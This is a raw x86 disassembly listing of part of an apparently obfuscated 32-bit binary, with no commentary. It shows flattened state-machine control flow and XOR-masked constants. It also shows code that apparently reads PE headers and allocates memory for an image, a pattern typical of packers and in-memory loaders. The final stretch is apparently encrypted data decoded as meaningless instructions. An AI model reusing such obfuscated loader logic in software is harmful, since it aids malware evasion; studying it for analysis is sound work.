  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	popw   es
  420607:	xor    dl,al
  420609:	fimul  DWORD PTR [eax]
  42060b:	add    DWORD PTR [ecx],0x0
  42060e:	cld    
  42060f:	add    DWORD PTR [eax],eax
  420611:	add    BYTE PTR [ecx-0x385221ca],ah
  420617:	js     0x42065c
  420619:	scas   eax,DWORD PTR es:[edi]
  42061a:	adc    edi,DWORD PTR [ecx+0x52a586de]
  420620:	je     0x4205b3
  420622:	in     al,0xec
  420624:	or     ebx,DWORD PTR [ebp-0xe]
  420627:	ds jbe 0x42066b
  42062a:	std    
  42062b:	pop    ebx
  42062c:	mul    BYTE PTR [edi+esi*8+0x14]
  420630:	mov    WORD PTR [edi-0x15],?
  420633:	jmp    0xe98c:0xe11f30a0
  42063a:	xor    edx,eax
  42063c:	lds    ebx,FWORD PTR [ebx-0x1d]
  42063f:	pop    ebx
  420640:	mov    edi,0x1b4e8bb5
  420645:	mov    fs,WORD PTR [ebx-0x29]
  420648:	das    
  420649:	xor    al,0x4c
  42064b:	xchg   BYTE PTR [ecx],bh
  42064d:	inc    edi
  42064e:	pop    ss
  42064f:	xor    esi,DWORD PTR [ebx-0x7]
  420652:	stos   DWORD PTR es:[edi],eax
  420653:	and    DWORD PTR [eax+0x2d],ebx
  420656:	jb     0x4205ed
  420658:	mov    DWORD PTR [ebx-0x1d97f942],0xa8d592fa
  420662:	rol    BYTE PTR [ebx],cl
  420664:	mov    ebp,0x4337480b
  420669:	mov    bh,0x51
  42066b:	add    BYTE PTR fs:[ebp+ebp*8-0x61a662ec],bh
  420673:	aam    0xf2
  420675:	inc    esp
  420676:	popa   
  420677:	or     DWORD PTR [esi+eax*1+0x49],0x629c7930
  42067f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420680:	jg     0x420662
  420682:	clc    
  420683:	jae    0x420625
  420685:	jmp    0xe20b449f
  42068a:	jne    0x420691
  42068c:	sub    cl,0x44
  42068f:	mov    cl,BYTE PTR [edx+0x55]
  420692:	mov    ds,WORD PTR [esi-0x67]
  420695:	push   esi
  420696:	sub    BYTE PTR [ebp+0x61],0x47
  42069a:	into   
  42069b:	sub    DWORD PTR ds:0x97befa8e,ecx
  4206a1:	test   al,0x2d
  4206a3:	dec    ebp
  4206a4:	push   0xa
  4206a6:	gs inc ebx
  4206a8:	stc    
  4206a9:	pop    ss
  4206aa:	outs   dx,DWORD PTR ds:[esi]
  4206ab:	not    edx
  4206ad:	pop    es
  4206ae:	fld    DWORD PTR ds:0xc68098dd
  4206b4:	push   ebx
  4206b5:	lock aas 
  4206b7:	dec    eax
  4206b8:	dec    eax
  4206b9:	push   edx
  4206ba:	and    BYTE PTR [esi-0x29],al
  4206bd:	into   
  4206be:	push   esp
  4206bf:	inc    esi
  4206c0:	pusha  
  4206c1:	int    0x13
  4206c3:	sub    BYTE PTR [esi+0x48a7a380],bl
  4206c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ca:	ss jp  0x4206c4
  4206cd:	ret    0xc7e3
  4206d0:	test   BYTE PTR [ecx],dl
  4206d2:	push   edi
  4206d3:	add    bh,BYTE PTR [edx+0x38760b07]
  4206d9:	mov    al,ds:0x8607b073
  4206de:	add    eax,0x6af95f82
  4206e3:	push   ss
  4206e4:	push   eax
  4206e5:	stos   DWORD PTR es:[edi],eax
  4206e6:	or     eax,0xb20978cb
  4206eb:	pusha  
  4206ec:	gs mov cl,0x62
  4206ef:	xlat   BYTE PTR ds:[ebx]
  4206f0:	push   ss
  4206f1:	xor    DWORD PTR [edi-0x5585bdca],eax
  4206f7:	jle    0x4206cf
  4206f9:	(bad)  
  4206fa:	push   ss
  4206fb:	cmp    eax,0x8ca06563
  420700:	out    dx,eax
  420701:	add    esp,esi
  420703:	sbb    dh,bl
  420705:	arpl   WORD PTR [eax-0x3e],bx
  420708:	dec    ebp
  420709:	cmp    cl,BYTE PTR [edx]
  42070b:	sbb    BYTE PTR [edx+0x72e5fae8],0xe0
  420712:	mov    edi,DWORD PTR ss:[esi+edi*1-0x80]
  420717:	out    dx,al
  420718:	imul   ebx,DWORD PTR [esi],0x836f44a9
  42071e:	adc    al,0x58
  420720:	stos   DWORD PTR es:[edi],eax
  420721:	jge    0x4206f7
  420723:	mov    al,0xc3
  420725:	lahf   
  420726:	or     DWORD PTR [edx+0x78b98d41],edi
  42072c:	sub    al,0x70
  42072e:	sbb    bl,al
  420730:	pop    ebx
  420731:	pop    esp
  420732:	pop    eax
  420733:	xor    eax,0x96c89f6f
  420738:	xchg   edi,eax
  420739:	add    al,0x87
  42073b:	sub    eax,0xda45b7fa
  420740:	mov    bh,0x61
  420742:	test   eax,0xe1b22da1
  420747:	lods   al,BYTE PTR ds:[esi]
  420748:	fmul   DWORD PTR [ebx+0x2fea4837]
  42074e:	int    0x1b
  420750:	bound  esp,QWORD PTR [eax]
  420752:	xor    ebp,DWORD PTR [ecx+0x6]
  420755:	dec    ecx
  420756:	idiv   BYTE PTR cs:[edi-0x60cf9df]
  42075d:	push   edi
  42075e:	push   edi
  42075f:	ds ret 
  420761:	ror    BYTE PTR [edx+ebp*1],1
  420764:	(bad)  
  420765:	psubd  xmm1,XMMWORD PTR [ebx+eiz*4+0x30]
  42076b:	pop    ebp
  42076c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42076d:	mov    DWORD PTR [ecx+0x711db894],0x2f3ee87a
  420777:	or     eax,0xc9ee3f6e
  42077c:	gs out 0x95,eax
  42077f:	xchg   BYTE PTR ss:[ebx-0x2c0f39c6],ah
  420786:	aaa    
  420787:	or     dl,BYTE PTR [ebx]
  420789:	push   0xffffffee
  42078b:	popf   
  42078c:	rcl    esi,1
  42078e:	pop    es
  42078f:	mov    eax,ds:0xa18a6dbc
  420794:	lea    esp,[edi-0x5e77ca20]
  42079a:	popf   
  42079b:	cmp    eax,0x3c9cfbfc
  4207a0:	jmp    0x30c6:0xb0fa6d41
  4207a7:	sar    DWORD PTR ss:[esi],1
  4207aa:	adc    eax,0x6f11046
  4207af:	and    eax,0xd3ae74dc
  4207b4:	xchg   esi,eax
  4207b5:	leave  
  4207b6:	mov    al,0xbd
  4207b8:	dec    esp
  4207b9:	lock cwde 
  4207bb:	jle    0x420794
  4207bd:	push   esi
  4207be:	pushf  
  4207bf:	int3   
  4207c0:	dec    ebx
  4207c1:	or     BYTE PTR [ebx+0x29cdd5f2],bl
  4207c7:	lock and eax,0x24599b89
  4207cd:	jmp    0x420784
  4207cf:	(bad)  
  4207d0:	fsub   QWORD PTR [edx-0x8e51405]
  4207d6:	cmc    
  4207d7:	sar    DWORD PTR [ecx],cl
  4207d9:	imul   eax,DWORD PTR [eax],0xffffffa8
  4207dc:	mov    dl,0xfd
  4207de:	push   ecx
  4207df:	in     eax,0xf6
  4207e1:	je     0x4207a6
  4207e3:	les    ecx,FWORD PTR [eax+0x2270e984]
